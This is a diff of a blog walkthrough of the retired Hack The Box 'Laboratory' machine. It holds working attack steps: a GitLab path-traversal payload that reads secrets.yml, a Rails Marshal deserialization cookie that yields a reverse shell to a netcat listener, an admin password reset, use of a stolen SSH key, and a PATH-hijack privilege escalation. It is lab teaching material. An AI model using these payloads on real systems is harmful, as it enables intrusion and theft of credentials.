 <p><strong>Why scan all ports?</strong> Services can run on non-standard ports. A developer might put a management panel on port 8443 or a database on 3306. If you only scan the top 1000, you might miss it. On HTB machines especially, scanning all ports is mandatory.</p>
 <p><strong>Result:</strong></p>
@@ -72,14 +71,14 @@ Target IP:   10.129.12.122
 443/tcp open  https
 </code></pre>
 <p>Three services. SSH (remote access), HTTP (web), HTTPS (encrypted web). This tells us it's a web application server.</p>
-<hr />
-<h3 id="step-3-detailed-service-scan-what-versions">Step 3: Detailed Service Scan — What Versions?</h3>
+<hr>
+<h3 id="step-3-detailed-service-scan-what-versions">Step 3: Detailed Service Scan: What Versions?</h3>
 <pre><code class="language-bash" data-language="bash">sudo nmap -p 22,80,443 -sCV 10.129.12.122
 </code></pre>
 <p><strong>What this does:</strong></p>
 <ul>
-<li><code>-sC</code> — run default NSE scripts (automated checks)</li>
-<li><code>-sV</code> — detect service versions</li>
+<li><code>-sC</code> : run default NSE scripts (automated checks)</li>
+<li><code>-sV</code> : detect service versions</li>
 <li>Focused on just the three open ports (faster)</li>
 </ul>
 <p><strong>Why version detection?</strong> Every piece of software has known vulnerabilities. Once you know "this is Apache 2.4.41" or "this is GitLab 12.8.1", you can search for public exploits. Version = attack surface.</p>
@@ -87,39 +86,39 @@ Target IP:   10.129.12.122
 <pre><code>ssl-cert: Subject: commonName=laboratory.htb
 Subject Alternative Name: DNS:git.laboratory.htb
 </code></pre>
-<p><strong>Hacker mindset:</strong> TLS certificates are goldmines for reconnaissance. They're signed identity documents — they tell you the real hostname(s) the server was configured for. The SAN (Subject Alternative Name) field reveals <code>git.laboratory.htb</code> — a subdomain we wouldn't have found any other way at this stage.</p>
-<hr />
+<p> TLS certificates are useful sources for reconnaissance. They're signed identity documents - they tell you the real hostname(s) the server was configured for. The SAN (Subject Alternative Name) field reveals <code>git.laboratory.htb</code> - a subdomain we wouldn't have found any other way at this stage.</p>
+<hr>
 <h3 id="step-4-add-hostnames-to-etc-hosts">Step 4: Add Hostnames to /etc/hosts</h3>
 <pre><code class="language-bash" data-language="bash">echo "10.129.12.122 laboratory.htb git.laboratory.htb" | sudo tee -a /etc/hosts
 </code></pre>
 <p><strong>Why?</strong> Your computer resolves hostnames to IPs using DNS. Since this is a private HTB machine, there's no DNS server that knows about <code>laboratory.htb</code>. By adding it to <code>/etc/hosts</code>, we manually tell our computer "when you see <code>laboratory.htb</code>, connect to <code>10.129.12.122</code>". Without this step, your browser would fail to load the site.</p>
-<hr />
-<h2 id="phase-2-enumeration">Phase 2 — Enumeration</h2>
+<hr>
+<h2 id="phase-2-enumeration">Phase 2: Enumeration</h2>
 <h3 id="step-5-browse-the-web-application">Step 5: Browse the Web Application</h3>
-<p>Visiting <code>https://laboratory.htb</code> shows a static company website — a security consultancy. Not much to attack directly.</p>
+<p>Visiting <code>https://laboratory.htb</code> shows a static company website - a security consultancy. Not much to attack directly.</p>
 <p>Visiting <code>https://git.laboratory.htb</code> reveals <strong>GitLab Community Edition</strong>.</p>
-<p><strong>Hacker mindset:</strong> GitLab is an extremely common target because:</p>
+<p> GitLab is an extremely common target because:</p>
 <ol>
 <li>It's often misconfigured (public registration allowed)</li>
 <li>It contains source code with secrets (passwords, API keys)</li>
 <li>It runs complex Rails code that has had historical vulnerabilities</li>
 <li>The version number is often visible in the UI</li>
 </ol>
-<hr />
+<hr>
 <h3 id="step-6-identify-the-gitlab-version">Step 6: Identify the GitLab Version</h3>
-<p>After registering an account (using <code>anything@laboratory.htb</code> — the server rejects non-laboratory.htb emails), go to <code>https://git.laboratory.htb/help</code>.</p>
+<p>After registering an account (using <code>anything@laboratory.htb</code> - the server rejects non-laboratory.htb emails), go to <code>https://git.laboratory.htb/help</code>.</p>
 <p><strong>Version: GitLab Community Edition 12.8.1</strong></p>
-<p><strong>Why register?</strong> Many GitLab vulnerabilities require authentication. An attacker registering a free account is a completely normal action — it's how the software is designed to work. From an authenticated position, you have a much larger attack surface.</p>
+<p><strong>Why register?</strong> Many GitLab vulnerabilities require authentication. An attacker registering a free account is a completely normal action - it's how the software is designed to work. From an authenticated position, you have a much larger attack surface.</p>
 <p><strong>Why check the version?</strong> This is the single most important piece of information. With a version number, you can search:</p>
 <ul>
 <li><code>searchsploit gitlab 12</code></li>
 <li>Google: <code>gitlab 12.8.1 exploit</code></li>
 <li>CVE databases</li>
 </ul>
-<p>This reveals <strong>CVE-2020-10977</strong> — an arbitrary file read vulnerability affecting GitLab &lt;= 12.9.0.</p>
-<hr />
-<h2 id="phase-3-exploitation-getting-a-foothold">Phase 3 — Exploitation (Getting a Foothold)</h2>
-<h3 id="step-7-cve-2020-10977-arbitrary-file-read">Step 7: CVE-2020-10977 — Arbitrary File Read</h3>
+<p>This reveals <strong>CVE-2020-10977</strong> - an arbitrary file read vulnerability affecting GitLab &lt;= 12.9.0.</p>
+<hr>
+<h2 id="phase-3-exploitation-getting-a-foothold">Phase 3: Exploitation (Getting a Foothold)</h2>
+<h3 id="step-7-cve-2020-10977-arbitrary-file-read">Step 7: CVE-2020-10977: Arbitrary File Read</h3>
 <p><strong>The vulnerability explained:</strong></p>
 <p>When you create an issue in GitLab and attach an image using Markdown like:</p>
 <pre><code>![img](/uploads/abc123/filename.png)
@@ -128,21 +127,21 @@ Subject Alternative Name: DNS:git.laboratory.htb
 <p><strong>How to exploit it manually:</strong></p>
 <ol>
 <li>Create two projects: <code>proj1</code> and <code>proj2</code></li>
-<li>In <code>proj1</code>, create an issue with this description:<pre><code>![a](/uploads/[redacted retired-lab hash or flag]/../../../../../../../../../../../../../../etc/passwd)
+<li>In <code>proj1</code>, create an issue with this description:<pre><code>![a](/uploads/REDACTED_HASH_OR_FLAG/../../../../../../../../../../../../../../etc/passwd)
 </code></pre>
 </li>
 <li>Move the issue to <code>proj2</code> using the "Move issue" option in the right sidebar</li>
-<li>In <code>proj2</code>, the issue now has a file attachment — click it to download <code>/etc/passwd</code></li>
+<li>In <code>proj2</code>, the issue now has a file attachment - click it to download <code>/etc/passwd</code></li>
 </ol>
-<p><strong>Hacker mindset:</strong> The <code>[redacted retired-lab hash or flag]</code> is a fake upload hash (32 chars). GitLab's file server resolves the path starting from the uploads directory. The <code>../../../../../../</code> sequences navigate UP the directory tree all the way to the filesystem root, then descend into <code>etc/passwd</code>. This is a classic <strong>path traversal</strong> attack.</p>
-<hr />
-<h3 id="step-8-read-secrets-yml-the-master-key">Step 8: Read secrets.yml — The Master Key</h3>
-<p>The real target isn't <code>/etc/passwd</code> — it's the Rails application's secret key. We read:</p>
+<p> The <code>REDACTED_HASH_OR_FLAG</code> is a fake upload hash (32 chars). GitLab's file server resolves the path starting from the uploads directory. The <code>../../../../../../</code> sequences navigate UP the directory tree all the way to the filesystem root, then descend into <code>etc/passwd</code>. This is a classic <strong>path traversal</strong> attack.</p>
+<hr>
+<h3 id="step-8-read-secrets-yml-the-master-key">Step 8: Read secrets.yml: The Master Key</h3>
+<p>The real target isn't <code>/etc/passwd</code> - it's the Rails application's secret key. We read:</p>
 <pre><code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
 </code></pre>
 <p>This file contains:</p>
 <pre><code class="language-yaml" data-language="yaml">production:
-  secret_key_base: [redacted encoded lab material]
+  secret_key_base: REDACTED_ENCODED_LAB_MATERIAL
 </code></pre>
 <p><strong>Why is this important?</strong> Rails uses <code>secret_key_base</code> to cryptographically sign cookies. It's the HMAC signing key. If you know this secret, you can:</p>
 <ol>
@@ -151,7 +150,7 @@ Subject Alternative Name: DNS:git.laboratory.htb
 <li>Achieve <strong>Remote Code Execution</strong> through Ruby object deserialization</li>
 </ol>
 <p>This is the pivot from "read files" to "run code". The file read vulnerability becomes an RCE vulnerability because we know the secret.</p>
-<hr />
+<hr>
 <h3 id="step-9-understanding-the-deserialization-attack">Step 9: Understanding the Deserialization Attack</h3>
 <p><strong>What is deserialization?</strong></p>
 <p>Rails stores signed cookies as:</p>
@@ -181,13 +180,13 @@ verifier = ActiveSupport::MessageVerifier.new(derived_key, serializer: Marshal)
 cookie_value = verifier.generate(depr)
 </code></pre>
 <p>When the target GitLab receives this cookie, it deserializes the proxy object. The moment Rails accesses ANY property or calls ANY method on it (which happens automatically), the proxy calls <code>erb.result</code>, which evaluates the ERB template, which runs our bash reverse shell.</p>
-<hr />
+<hr>
 <h3 id="step-10-the-ruby-version-problem-and-how-we-solved-it">Step 10: The Ruby Version Problem and How We Solved It</h3>
 <p><strong>The challenge:</strong> We can't just run this Ruby code anywhere.</p>
 <ul>
-<li>We tried <strong>Ruby 3.3</strong> (system Ruby) — FAILED. <code>ERB</code> objects have singleton classes in Ruby 3.x that prevent Marshal serialization. Error: <code>singleton class can't be dumped</code></li>
-<li>We tried <strong>Docker with GitLab 12.8.1</strong> (amd64 image) — FAILED. Our Kali machine is ARM64 (Apple Silicon / ARM chip), and the GitLab Docker image is x86-64 only.</li>
-<li>We tried <strong>Ruby 2.7</strong> (arm64 Docker image) — FAILED. Same singleton class issue.</li>
+<li>We tried <strong>Ruby 3.3</strong> (system Ruby) - FAILED. <code>ERB</code> objects have singleton classes in Ruby 3.x that prevent Marshal serialization. Error: <code>singleton class can't be dumped</code></li>
+<li>We tried <strong>Docker with GitLab 12.8.1</strong> (amd64 image) - FAILED. Our Kali machine is ARM64 (Apple Silicon / ARM chip), and the GitLab Docker image is x86-64 only.</li>
+<li>We tried <strong>Ruby 2.7</strong> (arm64 Docker image) - FAILED. Same singleton class issue.</li>
 </ul>
 <p><strong>The solution:</strong> GitLab 12.8.1 uses <strong>Ruby 2.6</strong> (you can see this from the path <code>/opt/gitlab/embedded/lib/ruby/gems/2.6.0/</code>). In Ruby 2.6, <code>ERB</code> objects CAN be Marshal'd. We use an ARM64 Ruby 2.6 Docker image:</p>
 <pre><code class="language-bash" data-language="bash">sudo docker pull arm64v8/ruby:2.6-alpine
@@ -197,11 +196,11 @@ sudo docker run --rm arm64v8/ruby:2.6-alpine sh -c "
   ruby -e '..cookie generation code..'
 "
 </code></pre>
-<p><strong>Hacker mindset:</strong> When something fails, ask "why?" and "what's different about the target environment?" The version mismatch between our attack machine and the target is the reason. Always match your exploit environment to the target's environment as closely as possible.</p>
-<hr />
+<p> When something fails, ask "why?" and "what's different about the target environment?" The version mismatch between our attack machine and the target is the reason. Always match your exploit environment to the target's environment as closely as possible.</p>
+<hr>
 <h3 id="step-11-generate-and-send-the-cookie">Step 11: Generate and Send the Cookie</h3>
 <p>The Docker container outputs our malicious cookie:</p>
-<pre><code>BAhvOkBBY3RpdmVTdXBwb3J0...--[redacted retired-lab hash or flag]
+<pre><code>BAhvOkBBY3RpdmVTdXBwb3J0...--REDACTED_HASH_OR_FLAG
 </code></pre>
 <p>Start a netcat listener:</p>
 <pre><code class="language-bash" data-language="bash">nc -lvnp 4444
@@ -211,14 +210,14 @@ sudo docker run --rm arm64v8/ruby:2.6-alpine sh -c "
   -b "experimentation_subject_id=BAhvOk..." \
   -o /dev/null
 </code></pre>
-<p><strong>Why <code>experimentation_subject_id</code>?</strong> GitLab uses this cookie for A/B testing features. The middleware that reads and deserializes this cookie runs on EVERY request, including unauthenticated ones. This is the attack vector — we don't need to be logged in.</p>
+<p><strong>Why <code>experimentation_subject_id</code>?</strong> GitLab uses this cookie for A/B testing features. The middleware that reads and deserializes this cookie runs on EVERY request, including unauthenticated ones. This is the attack vector - we don't need to be logged in.</p>
 <p><strong>Why send to <code>/users/sign_in</code>?</strong> It's a publicly accessible endpoint that will trigger the middleware. Any endpoint would work, but this is simple and reliable.</p>
 <p><strong>Result:</strong> Shell as <code>git</code> inside the GitLab Docker container.</p>
 <pre><code>git@git:~/gitlab-rails/working$ id
 uid=998(git) gid=998(git) groups=998(git)
 </code></pre>
-<hr />
-<h2 id="phase-4-post-exploitation-inside-the-container">Phase 4 — Post-Exploitation (Inside the Container)</h2>
+<hr>
+<h2 id="phase-4-post-exploitation-inside-the-container">Phase 4: Post-Exploitation (Inside the Container)</h2>
 <h3 id="step-12-container-enumeration">Step 12: Container Enumeration</h3>
 <p>We're inside a Docker container, not the actual host machine. How do we know?</p>
 <ul>
@@ -226,39 +225,39 @@ uid=998(git) gid=998(git) groups=998(git)
 <li><code>/proc/net/fib_trie</code> shows IP <code>172.17.0.2</code> (Docker bridge network)</li>
 <li>The <code>/.dockerenv</code> file exists</li>
 </ul>
-<p><strong>Hacker mindset:</strong> Getting a shell is just the beginning. You need to understand your position:</p>
+<p> Getting a shell is just the beginning. You need to understand your position:</p>
 <ul>
 <li>What user are you?</li>
 <li>What machine are you actually on?</li>
 <li>What can you reach from here?</li>
 <li>What secrets are accessible from this position?</li>
 </ul>
-<hr />
+<hr>
 <h3 id="step-13-reset-dexter-s-password-via-gitlab-rails-console">Step 13: Reset Dexter's Password via GitLab Rails Console</h3>
-<p>We have access to the GitLab application. The <code>git</code> user can run <code>gitlab-rails console</code> — a direct Ruby interactive console connected to the GitLab database.</p>
+<p>We have access to the GitLab application. The <code>git</code> user can run <code>gitlab-rails console</code> - a direct Ruby interactive console connected to the GitLab database.</p>
 <pre><code class="language-bash" data-language="bash">gitlab-rails console
 </code></pre>
 <pre><code class="language-ruby" data-language="ruby">user = User.where(id: 1).first  # User ID 1 is always the first admin
 # =&gt; #&lt;User id:1 @dexter&gt;
-user.password = REDACTED
+user.password = 'REDACTED'
 user.password_confirmation = 'Password123!'
 user.save!
 # =&gt; true
 </code></pre>
 <p><strong>Why?</strong> Dexter is the GitLab admin. Admins can see all projects including private ones. After resetting the password, we log into the GitLab web interface as dexter and find a <strong>private repository</strong> called <code>SecureDocker</code>.</p>
-<p><strong>Hacker mindset:</strong> In enterprise environments, admins often store sensitive materials in "private" repositories — SSH keys, credentials, deployment scripts. Gaining admin access to a code repository is often as valuable as gaining server access because developers store secrets there.</p>
-<hr />
+<p> In enterprise environments, admins often store sensitive materials in "private" repositories - SSH keys, credentials, deployment scripts. Gaining admin access to a code repository is often as valuable as gaining server access because developers store secrets there.</p>
+<hr>
 <h3 id="step-14-extract-dexter-s-ssh-private-key">Step 14: Extract Dexter's SSH Private Key</h3>
 <p>Inside the <code>SecureDocker</code> repository, dexter stored his personal SSH private key at <code>.ssh/id_rsa</code>. We download it.</p>
 <p>This key gives us the ability to SSH directly into the <strong>host machine</strong> (not just the container) as <code>dexter</code>.</p>
-<hr />
-<h2 id="phase-5-accessing-the-host-machine">Phase 5 — Accessing the Host Machine</h2>
+<hr>
+<h2 id="phase-5-accessing-the-host-machine">Phase 5: Accessing the Host Machine</h2>
 <h3 id="step-15-the-openssl-3-x-compatibility-issue">Step 15: The OpenSSL 3.x Compatibility Issue</h3>
 <pre><code class="language-bash" data-language="bash">ssh -i dexter_.ssh_id_rsa dexter@laboratory.htb
 # Load key "dexter_.ssh_id_rsa": error in libcrypto: unsupported
 </code></pre>
 <p><strong>Why does this fail?</strong> Our Kali Linux has OpenSSL 3.6.2 installed. OpenSSL 3.x has stricter security policies and removed support for certain legacy key operations. Dexter's SSH key was generated on the target machine (Ubuntu 20.04 with an older OpenSSL), and something about the key's format or parameters doesn't meet OpenSSL 3's requirements.</p>
-<p><strong>The fix — use Python's Paramiko library:</strong></p>
+<p><strong>The fix - use Python's Paramiko library:</strong></p>
 <p>Paramiko is Python's SSH implementation. It uses the <code>cryptography</code> Python library (which has its own key handling) rather than calling the system's OpenSSL directly. This bypasses the compatibility issue entirely.</p>
 <pre><code class="language-python" data-language="python">import paramiko
 k = paramiko.RSAKey.from_private_key_file('/home/kali/Downloads/htb/dexter_.ssh_id_rsa')
@@ -268,10 +267,10 @@ c.connect('laboratory.htb', username='dexter', pkey=k)
 stdin, stdout, stderr = c.exec_command('id &amp;&amp; cat ~/user.txt')
 print(stdout.read().decode())
 </code></pre>
-<p><strong>Hacker mindset:</strong> When a tool fails, use a different tool. The goal is to achieve the action (SSH with a key), not to use a specific binary. Paramiko, puttygen, openssl, or even a different OS could all solve this problem. Think about the goal, not the method.</p>
+<p> When a tool fails, use a different tool. The goal is to achieve the action (SSH with a key), not to use a specific binary. Paramiko, puttygen, openssl, or even a different OS could all solve this problem. Think about the goal, not the method.</p>
 <p><strong>User flag:</strong> <code>30c431[redacted]c3646856</code></p>
-<hr />
-<h2 id="phase-6-privilege-escalation-user-to-root">Phase 6 — Privilege Escalation (User to Root)</h2>
+<hr>
+<h2 id="phase-6-privilege-escalation-user-to-root">Phase 6: Privilege Escalation (User to Root)</h2>
 <h3 id="step-16-enumerate-suid-binaries">Step 16: Enumerate SUID Binaries</h3>
 <p>SUID (Set User ID) binaries run as their <strong>owner</strong> regardless of who executes them. A binary owned by root with SUID set will run as root even if a regular user executes it.</p>
 <pre><code class="language-bash" data-language="bash">find / -perm -4000 -user root -ls 2&gt;/dev/null
@@ -279,9 +278,9 @@ print(stdout.read().decode())
 <p>The interesting result:</p>
 <pre><code>7838  20 -rwsr-xr-x  1 root  dexter  16720  Aug 28 2020  /usr/local/bin/docker-security
 </code></pre>
-<p>Note: this binary is owned by <code>root</code> (runs as root when executed) but is in the <code>dexter</code> group (dexter can execute it). It's only 16KB — this is a custom binary, not a standard system tool.</p>
-<p><strong>Hacker mindset:</strong> Standard system SUID binaries (sudo, passwd, etc.) are well-audited and hard to exploit. Custom SUID binaries written by the box creator are almost always intentionally vulnerable. A 16KB custom SUID binary called <code>docker-security</code> is a massive red flag and should be the first thing you analyze.</p>
-<hr />
+<p>Note: this binary is owned by <code>root</code> (runs as root when executed) but is in the <code>dexter</code> group (dexter can execute it). It's only 16KB - this is a custom binary, not a standard system tool.</p>
+<p> Standard system SUID binaries (sudo, passwd, etc.) are well-audited and hard to exploit. Custom SUID binaries written by the box creator are almost always intentionally vulnerable. A 16KB custom SUID binary called <code>docker-security</code> is a massive warning sign and should be the first thing you analyze.</p>
+<hr>
 <h3 id="step-17-analyze-the-suid-binary-with-ltrace">Step 17: Analyze the SUID Binary with ltrace</h3>
 <p><code>ltrace</code> intercepts library calls made by a program. For this binary:</p>
 <pre><code class="language-bash" data-language="bash">ltrace docker-security
@@ -293,10 +292,10 @@ system("chmod 700 /usr/bin/docker"...)
 system("chmod 660 /var/run/docker.sock"...)
 </code></pre>
 <p><strong>The vulnerability revealed:</strong></p>
-<p>The binary calls <code>system("chmod 700 /usr/bin/docker")</code> — it runs <code>chmod</code> <strong>without a full path</strong>. When a program calls <code>system("chmod")</code>, Linux searches for <code>chmod</code> in the directories listed in the <code>PATH</code> environment variable, <strong>in order</strong>.</p>
+<p>The binary calls <code>system("chmod 700 /usr/bin/docker")</code> - it runs <code>chmod</code> <strong>without a full path</strong>. When a program calls <code>system("chmod")</code>, Linux searches for <code>chmod</code> in the directories listed in the <code>PATH</code> environment variable, <strong>in order</strong>.</p>
 <p>If we control the PATH variable, we control which <code>chmod</code> binary gets executed.</p>
-<hr />
-<h3 id="step-18-path-hijack-the-attack">Step 18: PATH Hijack — The Attack</h3>
+<hr>
+<h3 id="step-18-path-hijack-the-attack">Step 18: PATH Hijack: The Attack</h3>
 <p><strong>The concept:</strong></p>
 <p>The binary does (pseudocode):</p>
 <pre><code>setuid(0)     ← become root
@@ -315,24 +314,24 @@ export PATH=/tmp:$PATH
 </code></pre>
 <p><strong>Breaking this down:</strong></p>
 <ol>
-<li><code>printf '#!/bin/bash\nbash...' &gt; /tmp/chmod</code> — create a script named <code>chmod</code> that opens a reverse shell. The <code>#!/bin/bash</code> shebang is REQUIRED — without it, the system uses <code>/bin/sh</code> which doesn't support <code>&gt;&amp;</code> redirect syntax.</li>
-<li><code>chmod +x /tmp/chmod</code> — make our fake chmod executable (using the REAL chmod, since PATH hasn't been changed yet)</li>
-<li><code>export PATH=/tmp:$PATH</code> — prepend <code>/tmp</code> to PATH so our fake chmod is found first</li>
-<li><code>/usr/local/bin/docker-security</code> — trigger the exploit</li>
+<li><code>printf '#!/bin/bash\nbash...' &gt; /tmp/chmod</code> : create a script named <code>chmod</code> that opens a reverse shell. The <code>#!/bin/bash</code> shebang is REQUIRED - without it, the system uses <code>/bin/sh</code> which doesn't support <code>&gt;&amp;</code> redirect syntax.</li>
+<li><code>chmod +x /tmp/chmod</code> : make our fake chmod executable (using the REAL chmod, since PATH hasn't been changed yet)</li>
+<li><code>export PATH=/tmp:$PATH</code> : prepend <code>/tmp</code> to PATH so our fake chmod is found first</li>
+<li><code>/usr/local/bin/docker-security</code> : trigger the exploit</li>
 </ol>
 <p><strong>Result:</strong></p>
 <pre><code>root@laboratory:~# id
 uid=0(root) gid=0(root) groups=0(root),1000(dexter)
 </code></pre>
 <p><strong>Root flag:</strong> <code>17d585[redacted]11843934f7</code></p>
-<hr />
+<hr>
 <h2 id="summary-of-the-full-attack-chain">Summary of the Full Attack Chain</h2>
 <pre><code>[ATTACKER] nmap scan
     → Discovers ports 22, 80, 443
     → TLS cert reveals git.laboratory.htb
 
 [ATTACKER] Browse git.laboratory.htb  
-    → GitLab 12.8.1 — vulnerable to CVE-2020-10977
+    → GitLab 12.8.1 - vulnerable to CVE-2020-10977
 
 [CVE-2020-10977] Arbitrary file read
     → Read /opt/gitlab/embedded/.../secrets.yml
@@ -359,7 +358,7 @@ uid=0(root) gid=0(root) groups=0(root),1000(dexter)
 
 [ROOT] ROOT FLAG: 17d585[redacted]3934f7
 </code></pre>
-<hr />
+<hr>
 <h2 id="key-lessons-and-takeaways">Key Lessons and Takeaways</h2>
 <h3 id="1-certificates-leak-information">1. Certificates leak information</h3>
 <p>TLS certs often contain internal hostnames in SAN fields. Always check them with nmap or <code>openssl s_client</code>.</p>
@@ -374,12 +373,11 @@ uid=0(root) gid=0(root) groups=0(root),1000(dexter)
 <h3 id="6-suid-binaries-with-relative-paths-path-hijack">6. SUID binaries with relative paths = PATH hijack</h3>
 <p>Any SUID binary that calls <code>system("program")</code> without a full path like <code>system("/usr/bin/program")</code> is vulnerable to PATH hijacking. <code>ltrace</code> and <code>strace</code> are your best friends for finding these.</p>
 <h3 id="7-tools-fail-goals-don-t-change">7. Tools fail, goals don't change</h3>
-<p>When <code>ssh</code> failed with OpenSSL 3.x errors, the goal was still "authenticate as dexter via SSH key". Python's Paramiko achieved the same goal with a different tool.</p>
-27:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$2b"}}]
+<p>When <code>ssh</code> failed with OpenSSL 3.x errors, the goal was still "authenticate as dexter via SSH key". Python's Paramiko achieved the same goal with a different tool.</p>27:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$2b"}}]
 28:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L4",null,{"href":"/writing/hackthebox-kryptos-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Kryptos Walkthrough"}]]}]}],["$","$L4",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L4",null,{"href":"/writing/hackthebox-mirage-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Mirage Walkthrough"}]]}]}]]}]
 29:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L4",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L4","Research",{"href":"/research","children":"Research"}],["$","$L4","Services",{"href":"/services","children":"Services"}],["$","$L4","Writing",{"href":"/writing","children":"Writing"}],["$","$L4","Projects",{"href":"/projects","children":"Projects"}],["$","$L4","About",{"href":"/about","children":"About"}],["$","$L4","Contact",{"href":"/contact","children":"Contact"}],["$","$L4","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L4","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L4",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
-2c:T53a,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-laboratory-walkthrough/#article","headline":"Hack The Box: Laboratory Walkthrough","description":"An archived walkthrough of the retired Hack The Box Laboratory machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-laboratory-walkthrough/","datePublished":"2026-06-11T12:55:01.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2681,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/f73400434e3214a8b51a311c71fd49332ca5c718/HTB-Laboratory.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-laboratory-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-laboratory-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Laboratory Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-laboratory-walkthrough/"}]}]}2a:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$2c"}}]
+2c:T589,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-laboratory-walkthrough/#article","headline":"Hack The Box: Laboratory Walkthrough","description":"Authenticated GitLab path traversal leaks the Rails signing secret for deserialization RCE, private project data provides host SSH access, and a SUID binary's relative command call enables PATH hijacking to root.","url":"https://cyberkareem.com/writing/hackthebox-laboratory-walkthrough/","datePublished":"2026-06-11T12:55:01.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2608,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/f73400434e3214a8b51a311c71fd49332ca5c718/HTB-Laboratory.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-laboratory-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-laboratory-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Laboratory Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-laboratory-walkthrough/"}]}]}2a:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$2c"}}]
 1a:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","2",{"name":"theme-color","content":"#f2ede3"}],["$","meta","3",{"name":"color-scheme","content":"light"}]]
 2d:I[6869,[],"IconMark"]
 17:null
-1c:[["$","title","0",{"children":"Hack The Box: Laboratory Walkthrough | CyberKareem"}],["$","meta","1",{"name":"description","content":"An archived walkthrough of the retired Hack The Box Laboratory machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","2",{"name":"application-name","content":"CyberKareem"}],["$","link","3",{"rel":"author","href":"https://cyberkareem.com"}],["$","meta","4",{"name":"author","content":"Abdullah Kareem"}],["$","link","5",{"rel":"manifest","href":"/site.webmanifest","crossOrigin":"$undefined"}],["$","meta","6",{"name":"keywords","content":"CyberKareem,Abdullah Kareem,security researcher,penetration tester,CVE researcher,offensive security,responsible disclosure,web application penetration testing,API security assessment,mobile application security,application security consulting"}],["$","meta","7",{"name":"referrer","content":"strict-origin-when-cross-origin"}],["$","meta","8",{"name":"creator","content":"Abdullah Kareem"}],["$","meta","9",{"name":"publisher","content":"CyberKareem"}],["$","meta","10",{"name":"robots","content":"noindex, follow"}],["$","link","11",{"rel":"canonical","href":"https://cyberkareem.com/writing/hackthebox-laboratory-walkthrough/"}],["$","meta","12",{"property":"og:title","content":"Hack The Box: Laboratory Walkthrough"}],["$","meta","13",{"property":"og:description","content":"An archived walkthrough of the retired Hack The Box Laboratory machine, preserved from Abdullah Kareem's OSWE Prep preparation 